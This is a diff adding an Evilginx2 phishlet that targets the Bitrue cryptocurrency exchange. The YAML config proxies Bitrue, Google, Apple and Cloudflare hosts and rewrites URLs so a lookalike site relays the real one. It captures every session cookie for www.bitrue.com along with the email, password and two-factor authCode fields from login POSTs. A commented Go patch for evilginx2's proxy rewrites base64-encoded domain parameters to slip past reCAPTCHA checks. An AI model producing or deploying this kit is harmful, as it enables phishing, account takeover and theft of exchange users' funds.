@@ -1,0 +1,78 @@
+author: '@Evi1Grey5'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'bitrue.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'bitrue.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'sensors', orig_sub: 'sensors', domain: 'bitrue.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'sentry', orig_sub: 'sentry', domain: 'bitruedevops.link', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'futures', orig_sub: 'futures', domain: 'bitrue.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'b', orig_sub: 'b', domain: 'bitrue.com', session: true, is_landing: false, auto_filter: false}
+
+  - {phish_sub: 'www1', orig_sub: 'www1', domain: 'googletagmanager.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'appleid', orig_sub: 'appleid', domain: 'cdn-apple.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'csp', orig_sub: 'csp', domain: 'withgoogle.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cdnjs', orig_sub: 'cdnjs', domain: 'cloudflare.com', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'www.bitrue.com', orig_sub: 'www', domain: 'bitrue.com', search: 'https://{hostname}/', replace: 'https://{hostname_regexp}/', mimes: ['image/png', 'image/png', 'application/octet-stream', 'text/html', 'text/javascript', 'application/json', 'text/plain', 'text/css', 'font/woff2', 'application/x-javascript']}
+  - {triggers_on: 'static.bitrue.com', orig_sub: 'static', domain: 'bitrue.com', search: 'https://{hostname}/', replace: 'https://{hostname_regexp}:433', mimes: ['image/png', 'image/png', 'application/octet-stream', 'text/html', 'text/javascript', 'application/json', 'text/plain', 'text/css', 'font/woff2', 'application/x-javascript']}
+  - {triggers_on: 'sensors.bitrue.com', orig_sub: 'sensors', domain: 'bitrue.com', search: 'https://{hostname}/', replace: 'https://{hostname_regexp}:433', mimes: ['image/png', 'image/png', 'application/octet-stream', 'text/html', 'text/javascript', 'application/json', 'text/plain', 'text/css', 'font/woff2', 'application/x-javascript']}
+  - {triggers_on: 'sentry.bitruedevops.link', orig_sub: 'sentry', domain: 'bitruedevops.link', search: 'https://{hostname_regexp}/', replace: '{hostname_regexp}:433', mimes: ['text/html', 'text/javascript', 'application/json', 'text/plain', 'text/css', 'font/woff2', 'application/x-javascript']}
+  - {triggers_on: 'www.bitrue.com', orig_sub: 'sentry', domain: 'bitruedevops.link', search: 'https://{hostname_regexp}/', replace: '{hostname_regexp}:433', mimes: ['text/html', 'text/javascript', 'application/json', 'text/plain', 'text/css', 'font/woff2', 'application/x-javascript']}
+  - {triggers_on: 'futures.bitrue.com', orig_sub: 'futures', domain: 'bitrue.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'text/plain', 'text/css', 'font/woff2', 'application/x-javascript']}
+  
+  - {triggers_on: 'cdnjs.cloudflare.com', orig_sub: 'cdnjs', domain: 'cloudflare.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'text/plain', 'text/css', 'font/woff2', 'application/x-javascript']}
+  - {triggers_on: 'www.bitrue.com', orig_sub: 'cdnjs', domain: 'cloudflare.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}:433', mimes: ['text/html', 'text/javascript', 'application/json', 'text/plain', 'text/css', 'font/woff2', 'application/x-javascript']}
+  - {triggers_on: 'www1.googletagmanager.com', orig_sub: 'www1', domain: 'googletagmanager.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'text/plain', 'text/css', 'font/woff2', 'application/x-javascript']}
+  - {triggers_on: 'www.bitrue.com', orig_sub: 'cdnjs', domain: 'cloudflare.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}:433', mimes: ['text/html', 'text/javascript', 'application/json', 'text/plain', 'text/css', 'font/woff2', 'application/x-javascript']}
+
+
+
+auth_tokens:
+  - domain: 'www.bitrue.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+
+credentials:
+  username:  
+    key: 'email'
+    search: '(.*)'    
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'    
+    type: 'post' 
+  custom:
+    key: 'authCode'
+    search: '(.*)'    
+    type: 'post'  
+
+auth_urls:
+  - '/rewards'
+  - '/'
+
+login:
+  domain: 'www.bitrue.com'
+  path: '/user/login?callBackPath=https://www.bitrue.com/ru'
+
+# Recaptcha Bypass
+#Here's a workaround code to implement this. Replace the code in evilginx2, core/http_proxy.go 
+				#// patch GET query params with original domains & bypass recaptcha
+				#if pl != nil {
+					#qs := req.URL.Query()
+					#if len(qs) > 0 {
+						#for gp := range qs {
+							#for i, v := range qs[gp] {
+								#qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
+							#if qs[gp][i] == "aHR0cHM6Ly9hY2NvdW50cy5mYWtlLWRvbWFpbi5jb206NDQzCg" { // https://accounts.fake-domain.com:443
+								#qs[gp][i] = "aHR0cHM6Ly9hY2NvdW50cy5zYWZlLWRvbWFpbi5jb206NDQz" // https://accounts.safe-domain.com:443
+							#}
+							#}
+						#}
+						#req.URL.RawQuery = qs.Encode()
+					#}
+				#}
+#Here the parameter co contains string co=aHR0cHM6Ly9hY2NvdW50cy5zYWZlLWRvbWFpbi5jb206NDQz which is the base64 encoding of https://accounts.safe-domain.com:443
